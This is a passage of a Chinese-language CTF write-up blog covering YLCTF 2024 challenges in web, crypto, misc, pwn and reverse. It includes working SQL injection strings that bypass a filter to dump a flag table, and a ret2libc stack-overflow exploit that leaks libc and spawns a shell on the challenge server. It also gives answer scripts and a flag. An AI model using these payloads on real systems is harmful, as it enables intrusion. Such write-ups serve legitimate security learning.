class="hljs-variable">$a</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a1</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;1;N&#x27;</span>, <span class="hljs-string">&#x27;0;N&#x27;</span>, <span class="hljs-variable">$s</span>);<br><span class="hljs-comment">// 输出 URL 编码后的字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/pexpl.png" srcset="/img/loading.gif" lazyload alt="pexpl"></p>
<h5 id="round-1-sinxx复现"><a class="markdownIt-Anchor" href="#round-1-sinxx复现"></a> [Round 1] sInXx(复现)</h5>
<p>这题在写的时候一直没找到注入点，跟着复现一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=juan79%27%09and%09(1=1)%23<br></code></pre></td></tr></table></figure>
<p>这个是有回显的，看下面的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=juan79%27%09and%09(1=2)%23<br></code></pre></td></tr></table></figure>
<p>这个就是无回显的</p>
<p>然后接着继续测试一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=juan79%27%09union%09select%091,2,3,4%23<br></code></pre></td></tr></table></figure>
<p>测试发现<code>,</code>应该被过滤了，可以用别名进行查询</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=1<span class="hljs-string">&#x27;%09UNION%09SELECT%09*%09FROM%09((SELECT%091)A%09join%09(SELECT%091)B%09join(SELECT%091)C%09join%09(SELECT%091)D%09join%09(SELECT%091)E)#</span><br></code></pre></td></tr></table></figure>
<p>继续测(不是MySQL的数据库，而是sql sever的数据库)</p>
<p><code>sys.schema_table_statistics_with_buffer</code> 是一个系统表，通常在 SQL Server 中存在，包含关于表的统计信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=1<span class="hljs-string">&#x27;%09UNION%09SELECT%09*%09FROM%09((SELECT%09GROUP_CONCAT(TABLE_NAME)FROM%09sys.schema_table_statistics_with_buffer%09WHERE%09TABLE_SCHEMA=DATABASE())A%09join%09(SELECT%091)B%09join(SELECT%091)C%09join%09(SELECT%091)D%09join%09(SELECT%091)E)#</span><br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/sInXx.png" srcset="/img/loading.gif" lazyload alt="sInXx"></p>
<p>继续往下测</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search=1<span class="hljs-string">&#x27;%09UNION%09SELECT%09*%09FROM%09((SELECT%09`2`%09FROM%09(SELECT%09*%09FROM%09((SELECT%091)a%09JOIN%09(SELECT%092)b)%09UNION%09SELECT%09*%09FROM%09DataSyncFLAG)p%09limit%092%09offset%091)A%09join%09(SELECT%091)B%09join(SELECT%091)C%09join%09(SELECT%091)D%09join%09(SELECT%091)E)#</span><br></code></pre></td></tr></table></figure>
<p>最后得到了flag这个数据库没怎么遇见过涨知识了,</p>
<p>还有一道java我最近刚开始学，先不复现了。</p>
<h3 id="round-2"><a class="markdownIt-Anchor" href="#round-2"></a> Round 2</h3>
<h4 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> crypto</h4>
<h5 id="round-2-ezaes"><a class="markdownIt-Anchor" href="#round-2-ezaes"></a> [Round 2] ezAES</h5>
<p>key和iv需要进行填充，得到字符串只会输入靶场得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_bytes</span>(<span class="hljs-params">data, size</span>):<br>    <span class="hljs-keyword">return</span> data[:size].ljust(size, <span class="hljs-string">b&#x27;\0&#x27;</span>)<br><br><span class="hljs-comment"># Adjust key and IV to be exactly 16 bytes</span><br>key = adjust_bytes(<span class="hljs-string">b&#x27;YLCTF-CRYPTO&#x27;</span>, <span class="hljs-number">16</span>)<br>iv = adjust_bytes(<span class="hljs-string">b&#x27;YLCTF-IV&#x27;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Key:&quot;</span>, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IV:&quot;</span>, iv)<br><br><span class="hljs-comment"># The encrypted data</span><br>encrypted_data = <span class="hljs-string">b&#x27;\xed\x1d]\xe6p\xb7\xfa\x90/Gu\xf4\xe2\x96\x84\xef90\x92e\xb4\xf8]&quot;\xfc6\xf8\x8cS\xe9b\x19&#x27;</span><br><br><span class="hljs-comment"># Create the AES cipher object</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br><br><span class="hljs-comment"># Decrypt the data</span><br>decrypted_data = cipher.decrypt(encrypted_data)<br><br><span class="hljs-comment"># Remove padding</span><br><span class="hljs-keyword">try</span>:<br>    unpadded_data = unpad(decrypted_data, AES.block_size)<br>    <span class="hljs-comment"># Convert to string</span><br>    flag = unpadded_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag:&quot;</span>, flag)<br><span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decryption failed. Error:&quot;</span>, <span class="hljs-built_in">str</span>(e))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Raw decrypted data:&quot;</span>, decrypted_data)<br></code></pre></td></tr></table></figure>
<h5 id="round-2-ancat三血"><a class="markdownIt-Anchor" href="#round-2-ancat三血"></a> [Round 2] ancat(三血)</h5>
<p>通过反 Arnold 变换对图像进行解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arnold_decode</span>(<span class="hljs-params">image, shuffle_times, a, b</span>):<br><br>    decode_image = np.zeros(shape=image.shape, dtype=np.uint8)<br>    h, w = image.shape[<span class="hljs-number">0</span>], image.shape[<span class="hljs-number">1</span>]<br>    N = h  <span class="hljs-comment"># Assuming square image, otherwise use min(h, w)</span><br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(shuffle_times):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>            <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>                new_x = ((a*b+<span class="hljs-number">1</span>)*x + (-b)*y) % N<br>                new_y = (-a*x + y) % N<br>                decode_image[new_x, new_y, :] = image[x, y, :]<br>        image = np.copy(decode_image)<br><br>    cv2.imwrite(<span class="hljs-string">&#x27;de_flag.png&#x27;</span>, decode_image, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> decode_image<br><br><span class="hljs-comment"># Usage</span><br>img = cv2.imread(<span class="hljs-string">&#x27;en_flag.png&#x27;</span>)<br>decoded_img = arnold_decode(img, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>)<br></code></pre></td></tr></table></figure>
<h5 id="round-2-hhhhhash二血"><a class="markdownIt-Anchor" href="#round-2-hhhhhash二血"></a> [Round 2] hhhhhash(二血)</h5>
<p>通过 RSA 加密和解密的操作，生成一个由 <code>2</code> 和 <code>3</code> 相关的预映像。该预映像是由两个固定值 <code>2</code> 和 <code>3</code>，以及它们加密后异或的解密结果组成的字符串。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><br><span class="hljs-comment"># 给定的 RSA 参数</span><br>N = <span class="hljs-number">24187393262220937846390501443742832858626434119009614437585110078354058452015513549456536194956883531427150348615517313864237793745207153851247294085645697596388459039963846522372296585446089302800483043022329465803710493794211051569707438274254451965191340677881575500674368344178840546343108889174677894222885416258598492663798090390503785098514218961277236306118846673370386248291600553097856252637702622367340613301550171775336709322733018489345819827313673171715980174821509418454309036717777663660169340209676530313209371349708592854940984111594670893579387030559835418881208057159859916049414143236495356055079</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 计算 c = pow(2, e, N) ^ pow(3, e, N)</span><br>c = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e, N) ^ <span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>, e, N)<br><br><span class="hljs-comment"># 计算 phi 和 d</span><br>phi = N - <span class="hljs-number">1</span>  <span class="hljs-comment"># 注意：这个假设只在 N 是梅森素数时成立</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># 计算 x</span><br>x = <span class="hljs-built_in">pow</span>(c, d, N)<br><br><span class="hljs-comment"># 将结果转换为字节并编码为十六进制</span><br>b0 = (<span class="hljs-number">2</span>).to_bytes(<span class="hljs-number">256</span>, <span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>()<br>b1 = (<span class="hljs-number">3</span>).to_bytes(<span class="hljs-number">256</span>, <span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>()<br>b2 = x.to_bytes(<span class="hljs-number">256</span>, <span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-comment"># 组合最终的 preimage</span><br>preimage = b0 + b1 + b2<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Calculated preimage:&quot;</span>)<br><span class="hljs-built_in">print</span>(preimage)<br></code></pre></td></tr></table></figure>
<h5 id="round-2-rand一血"><a class="markdownIt-Anchor" href="#round-2-rand一血"></a> [Round 2] rand(一血)</h5>
<p>参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/659030157">ASIS2023 Crypto - 知乎 (zhihu.com)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">46464</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):  <span class="hljs-comment"># 本地测试不知道要多少轮，直接拉到400得到flag会自己断的</span><br>    line = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>.encode())<br>    line_decoded = line.decode()<br>    <span class="hljs-built_in">print</span>(line_decoded)  <span class="hljs-comment"># 打印解码后的内容</span><br><br>    numbers = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, line_decoded)<br>    <span class="hljs-keyword">if</span> numbers:<br>        p_value = <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">0</span>])<br>        g = p_value - <span class="hljs-number">4</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p_value)<br><br>        line = p.recvuntil(<span class="hljs-string">&quot;g:&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(line.decode())<br><br>        p.sendline(<span class="hljs-built_in">str</span>(g).encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;g =&quot;</span>, g)<br><br>        line = p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(line.decode())<br><br>        x = <span class="hljs-number">2</span><br>        y = p_value - <span class="hljs-number">2</span><br>        p.sendline(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;x&#125;</span>,<span class="hljs-subst">&#123;y&#125;</span>&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sending: <span class="hljs-subst">&#123;x&#125;</span>,<span class="hljs-subst">&#123;y&#125;</span>&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h4 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2"></a> Misc</h4>
<h5 id="round-2-imgai三血"><a class="markdownIt-Anchor" href="#round-2-imgai三血"></a> [Round 2] IMGAI(三血)</h5>
<p>和iscc 2024的re题有点相似，也是需要识别图片转得知文字，利用模型得到答案</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MNISTCNN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MNISTCNN, <span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.conv1 = nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.conv2 = nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">5</span>)<br>        <span class="hljs-variable language_">self</span>.fc1 = nn.Linear(<span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>, <span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.fc2 = nn.Linear(<span class="hljs-number">1024</span>, <span class="hljs-number">10</span>)<br>        <span class="hljs-variable language_">self</span>.pool = nn.MaxPool2d(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>        <span class="hljs-variable language_">self</span>.relu = nn.ReLU()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv1(x)))<br>        x = <span class="hljs-variable language_">self</span>.pool(<span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.conv2(x)))<br>        x = x.view(-<span class="hljs-number">1</span>, <span class="hljs-number">64</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>)<br>        x = <span class="hljs-variable language_">self</span>.relu(<span class="hljs-variable language_">self</span>.fc1(x))<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.fc2(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_model</span>(<span class="hljs-params">model_path</span>):<br>    model = MNISTCNN()<br>    model.load_state_dict(torch.load(model_path, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>)))<br>    model.<span class="hljs-built_in">eval</span>()<br>    <span class="hljs-keyword">return</span> model<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preprocess_image</span>(<span class="hljs-params">binary_data</span>):<br>    image_array = np.array([<span class="hljs-built_in">int</span>(pixel) <span class="hljs-keyword">for</span> pixel <span class="hljs-keyword">in</span> binary_data]).reshape(<span class="hljs-number">480</span>, <span class="hljs-number">640</span>)<br>    image = Image.fromarray(np.uint8(image_array * <span class="hljs-number">255</span>), mode=<span class="hljs-string">&#x27;L&#x27;</span>)<br>    transform = transforms.Compose([<br>        transforms.Resize((<span class="hljs-number">28</span>, <span class="hljs-number">28</span>)),<br>        transforms.ToTensor(),<br>        transforms.Normalize((<span class="hljs-number">0.1307</span>,), (<span class="hljs-number">0.3081</span>,))<br>    ])<br>    <span class="hljs-keyword">return</span> transform(image).unsqueeze(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">predict_digit</span>(<span class="hljs-params">model, image</span>):<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        output = model(image)<br>        <span class="hljs-keyword">return</span> torch.<span class="hljs-built_in">max</span>(output, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].item()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">30991</span>)<br>        model = load_model(<span class="hljs-string">&#x27;model.pth&#x27;</span>)<br>        predictions = []<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">36</span>):<br>            <span class="hljs-keyword">try</span>:<br>                data = p.recvuntil(<span class="hljs-string">f&quot;input num <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span> \n&quot;</span>.encode(), timeout=<span class="hljs-number">3</span>)<br>                binary_data = re.findall(<span class="hljs-string">r&quot;[01]+&quot;</span>, data.decode())<br><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> binary_data:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;No binary data found in round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>. Exiting...&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br><br>                image = preprocess_image(binary_data[<span class="hljs-number">0</span>].strip())<br>                predicted = predict_digit(model, image)<br>                predictions.append(predicted)<br><br>                p.sendline(<span class="hljs-built_in">str</span>(predicted).encode())<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: Predicted digit: <span class="hljs-subst">&#123;predicted&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">except</span> EOFError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Connection closed unexpectedly in round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error in round <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br>        final_data = p.recvall(timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Final server response:&quot;</span>, final_data.decode())<br><br>        predicted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, predictions))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All predicted digits as a string:&quot;</span>, predicted_string)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;p&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">locals</span>():<br>            p.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<h5 id="round-2-trace"><a class="markdownIt-Anchor" href="#round-2-trace"></a> [Round 2] Trace</h5>
<p>图片用010打开发现后面一大段有base64编码，去赛博转换一下得到一个rar文件，PassFabforRAR解密一下，得到密码370950解密得到里面的图片</p>
<img src="/../../images/ylctf/2024/test.png" srcset="/img/loading.gif" lazyload alt="test" style="zoom:50%;">
<p>仔细在记事本上研究了一会拼出了flag</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">YLCTF&#123;ccfe9e2c-391f-4055-a128-c06b65426c83&#125;<br></code></pre></td></tr></table></figure>
<h4 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2"></a> Pwn</h4>
<h5 id="round-2-ezstack2"><a class="markdownIt-Anchor" href="#round-2-ezstack2"></a> [Round 2] ezstack2</h5>
<p>有nx保护</p>
<p>ida看，stack里有栈溢出，vuln里有判断执行system(“sh”)。</p>
<p><img src="/../../images/ylctf/2024/stack1.png" srcset="/img/loading.gif" lazyload alt="stack1"></p>
<p>通过read栈溢出触发puts函数的调用，并通过GOT地址泄露libc的地址.</p>
<p>使用ROPgadget获取pop_rdi和ret地址,通过read栈溢出触发puts函数的调用，并通过GOT地址泄露libc地址,最后泄露libc地址和执行system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">25160</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>rdi = <span class="hljs-number">0x400823</span><br>main = <span class="hljs-number">0x40070A</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span> + <span class="hljs-number">8</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload1)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x40056e</span>) + p64(rdi) + p64(binsh) + p64(sys)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/stack2.png" srcset="/img/loading.gif" lazyload alt="stack2"></p>
<h4 id="re-2"><a class="markdownIt-Anchor" href="#re-2"></a> Re</h4>
<h5 id="round-2-三点几啦饮茶先"><a class="markdownIt-Anchor" href="#round-2-三点几啦饮茶先"></a> [Round 2] 三点几啦饮茶先</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decipher</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = v<br>    <span class="hljs-built_in">sum</span> = (<span class="hljs-number">289739961</span> * <span class="hljs-number">40</span>) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># Initial sum value</span><br>    delta = <span 